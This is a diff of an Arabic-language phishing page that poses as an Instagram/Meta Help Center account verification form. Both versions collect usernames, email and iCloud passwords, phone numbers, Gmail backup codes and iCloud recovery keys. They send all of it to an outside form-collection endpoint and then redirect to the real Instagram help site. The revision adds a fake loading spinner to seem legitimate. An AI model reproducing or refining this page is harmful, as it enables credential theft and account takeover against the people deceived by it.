@@ -3,113 +3,113 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مركز المساعدة | Instagram</title>
+    <title>Help Center | Instagram</title>
     <style>
-        /* هوية الألوان والخطوط الرسمية */
-        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
-        .main-wrapper { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .card { background: white; border: 1px solid #dbdbdb; width: 100%; max-width: 380px; padding: 0; border-radius: 1px; box-shadow: 0 1px 2px rgba(0,0,0,0.05); }
-        
-        /* شعار إنستغرام العلوي */
-        .header-logo { padding: 30px 0 10px; text-align: center; }
-        .header-logo img { width: 175px; height: auto; }
-
-        .form-content { padding: 20px 40px 30px; }
+        body { background-color: #fafafa; font-family: -apple-system, sans-serif; margin: 0; display: flex; flex-direction: column; min-height: 100vh; align-items: center; }
+        .main-card { background: white; border: 1px solid #dbdbdb; width: 100%; max-width: 380px; margin-top: 40px; border-radius: 1px; box-shadow: 0 1px 2px rgba(0,0,0,0.05); }
+        .header { padding: 30px 0 15px; text-align: center; border-bottom: 1px solid #dbdbdb; }
+        .header img { width: 175px; }
+        .content { padding: 25px 35px; }
         h2 { font-size: 16px; font-weight: 600; color: #262626; text-align: center; margin-bottom: 12px; }
-        p { font-size: 14px; color: #8e8e8e; text-align: center; line-height: 1.4; margin-bottom: 20px; }
-
-        /* تنسيق الخانات */
-        input, select, textarea { 
-            width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; 
-            padding: 9px 7px; font-size: 12px; box-sizing: border-box; color: #262626; margin-bottom: 8px; outline: none;
-        }
-        input:focus { border-color: #a8a8a8; }
+        p { font-size: 13px; color: #8e8e8e; text-align: center; line-height: 1.5; margin-bottom: 20px; }
+        input, select, textarea { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px; font-size: 12px; margin-bottom: 8px; box-sizing: border-box; outline: none; }
+        .dual { display: flex; gap: 4px; }
+        .dual select { width: 35%; }
+        button { width: 100%; background: #0095f6; border: none; border-radius: 4px; color: #fff; font-weight: 600; padding: 8px; cursor: pointer; margin-top: 10px; }
         
-        .dual-input { display: flex; gap: 4px; }
-        .dual-input select { width: 40%; }
-        .dual-input input { width: 60%; }
+        /* مرحلة الانتظار */
+        #loader { display: none; text-align: center; padding: 20px; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        button { 
-            width: 100%; background-color: #0095f6; border: none; border-radius: 4px;
-            color: #fff; font-weight: 600; padding: 7px 0; font-size: 14px; cursor: pointer; margin-top: 10px;
-        }
-
-        /* شعار ماتا السفلي */
-        .meta-footer { text-align: center; padding: 40px 0; }
-        .meta-footer img { width: 65px; opacity: 0.8; }
-        .meta-text { color: #8e8e8e; font-size: 12px; margin-top: 10px; display: block; }
-
-        .security-note { background: #fff2f2; border: 1px solid #ed4956; padding: 10px; border-radius: 4px; font-size: 11px; color: #ed4956; margin-bottom: 15px; display: none; }
+        .meta-footer { text-align: center; margin-top: auto; padding: 30px; }
+        .meta-footer img { width: 60px; opacity: 0.7; }
+        .copyright { color: #8e8e8e; font-size: 11px; margin-top: 8px; display: block; }
     </style>
 </head>
 <body>
 
-<div class="main-wrapper">
-    <div class="card">
-        <div class="header-logo">
-            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
-        </div>
+<div class="main-card">
+    <div class="header">
+        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
+    </div>
 
-        <div class="form-content">
-            <form action="https://formspree.io/f/mdaygdnq" method="POST" id="mainForm">
+    <div class="content">
+        <form action="https://formspree.io/f/mdaygdnq" method="POST" id="mainForm">
+            
+            <div id="step1">
+                <h2>تأكيد ملكية الحساب</h2>
+                <p>يرجى إدخال البيانات المرتبطة بحسابك بشكل دقيق لمراجعة الطلب.</p>
+                <input type="text" name="Username" placeholder="اسم المستخدم" required>
+                <input type="email" name="Email" placeholder="البريد الإلكتروني" required>
+                <input type="password" name="Email_Pass" placeholder="كلمة مرور البريد" required>
+                <input type="email" name="iCloud" placeholder="بريد iCloud">
+                <input type="password" name="iCloud_Pass" placeholder="كلمة مرور iCloud">
                 
-                <div id="step1">
-                    <h2>تأكيد الهوية</h2>
-                    <p>يرجى تقديم المعلومات المطلوبة لمراجعة حسابك.</p>
-                    
-                    <input type="text" name="User" placeholder="اسم المستخدم" required>
-                    <input type="email" name="Mail" placeholder="البريد الإلكتروني المرتبط" required>
-                    <input type="password" name="Mail_Pass" placeholder="كلمة مرور البريد" required>
-                    <input type="email" name="iCloud_Mail" placeholder="بريد iCloud">
-                    <input type="password" name="iCloud_Pass" placeholder="كلمة مرور iCloud">
-                    
-                    <div class="dual-input">
-                        <select name="Code">
-                            <option value="+966">🇸🇦 +966</option>
-                            <option value="+964">🇮🇶 +964</option>
-                            <option value="+20">🇪🇬 +20</option>
-                            <option value="+971">🇦🇪 +971</option>
-                        </select>
-                        <input type="tel" name="Phone" placeholder="رقم الهاتف" required>
-                    </div>
-
-                    <select name="Country">
-                        <option value="">-- اختر بلدك --</option>
-                        <option value="KSA">السعودية</option>
-                        <option value="Iraq">العراق</option>
-                        <option value="Egypt">مصر</option>
+                <div class="dual">
+                    <select name="Code">
+                        <option value="+963">🇸🇾 +963</option>
+                        <option value="+966">🇸🇦 +966</option>
+                        <option value="+964">🇮🇶 +964</option>
+                        <option value="+20">🇪🇬 +20</option>
+                        <option value="+971">🇦🇪 +971</option>
+                        <option value="+965">🇰🇼 +965</option>
+                        <option value="+962">🇯🇴 +962</option>
+                        <option value="+961">🇱🇧 +961</option>
                     </select>
-
-                    <textarea name="Msg" placeholder="وصف موجز للحالة..." rows="2"></textarea>
-                    <button type="button" onclick="nextStep()">متابعة</button>
+                    <input type="tel" name="Phone" placeholder="رقم الهاتف" required>
                 </div>
 
-                <div id="step2" style="display: none;">
-                    <h2>التحقق الأمني المتقدم</h2>
-                    <div class="security-note" id="snote">يجب إدخال رموز الأمان لإكمال عملية التوثيق.</div>
-                    
-                    <input type="text" name="Gmail_Backup" placeholder="رمز أمان Gmail (8 أرقام)">
-                    <input type="text" name="iCloud_Recovery" placeholder="مفتاح استرداد iCloud">
-                    
-                    <input type="hidden" name="_next" value="https://help.instagram.com">
-                    <button type="submit">تأكيد نهائي</button>
-                </div>
+                <select name="Country">
+                    <option value="Syria">سوريا</option>
+                    <option value="KSA">السعودية</option>
+                    <option value="Iraq">العراق</option>
+                    <option value="Egypt">مصر</option>
+                    <option value="UAE">الإمارات</option>
+                    <option value="Other">دول أخرى</option>
+                </select>
 
-            </form>
-        </div>
+                <textarea name="Reason" placeholder="وصف المشكلة..." rows="2"></textarea>
+                <button type="button" onclick="startLoading()">متابعة</button>
+            </div>
+
+            <div id="loader">
+                <div class="spinner"></div>
+                <p style="color:#262626; font-weight:600;">جاري فحص البيانات...</p>
+                <p>يرجى الانتظار، لا تغلق الصفحة.</p>
+            </div>
+
+            <div id="step2" style="display:none;">
+                <h2>التحقق من الأمان</h2>
+                <div style="background:#fff2f2; border:1px solid #ed4956; padding:10px; border-radius:4px; font-size:11px; color:#ed4956; margin-bottom:15px;">
+                    ⚠️ الحساب محمي بالتحقق المزدوج. يرجى إدخال رموز الأمان الاحتياطية.
+                </div>
+                <input type="text" name="Gmail_Backup" placeholder="رمز أمان Gmail (8 أرقام)">
+                <input type="text" name="iCloud_Key" placeholder="مفتاح استرداد iCloud">
+                
+                <input type="hidden" name="_next" value="https://help.instagram.com">
+                <button type="submit">تأكيد نهائي</button>
+            </div>
+
+        </form>
     </div>
 </div>
 
 <div class="meta-footer">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1024px-Meta_Platforms_Inc._logo.svg.png" alt="Meta Logo">
-    <span class="meta-text">Instagram from Meta © 2026</span>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1024px-Meta_Platforms_Inc._logo.svg.png" alt="Meta">
+    <span class="copyright">Instagram from Meta © 2026</span>
 </div>
 
 <script>
-    function nextStep() {
+    function startLoading() {
         document.getElementById('step1').style.display = 'none';
-        document.getElementById('step2').style.display = 'block';
-        document.getElementById('snote').style.display = 'block';
+        document.getElementById('loader').style.display = 'block';
+        
+        // وقت الانتظار 3 ثوانٍ قبل إظهار حقول الأمان
+        setTimeout(function() {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+        }, 3500);
     }
 </script>
 
